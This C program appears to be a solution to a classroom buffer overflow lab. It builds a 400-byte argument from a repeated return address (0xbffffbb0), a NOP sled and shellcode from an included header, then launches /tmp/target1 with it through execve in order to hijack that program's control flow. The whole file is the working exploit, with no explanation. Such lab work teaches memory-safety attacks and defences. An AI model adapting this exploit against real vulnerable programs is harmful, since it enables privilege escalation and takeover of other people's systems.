#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"


#define TARGET "/tmp/target1"
#define NOP '\x90'

int main(void)
{
  
  char buffer[400];
  char *args[3];
  char *env[1];
  int *addr = (int *) buffer;
  for (int i = 0; i < 100; i+=1){  
      *(addr+i) = (int *) 0xbffffbb0;
  }

  for (int i = 0; i < 100 ; i++){
    buffer[i] = NOP; 
  }
  
  for (int i = 0; i < strlen(shellcode); i++){
    buffer[100 + i] = shellcode[i];
  }

 
  args[0] = TARGET; args[1] = buffer; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");
  
  return 0;
}
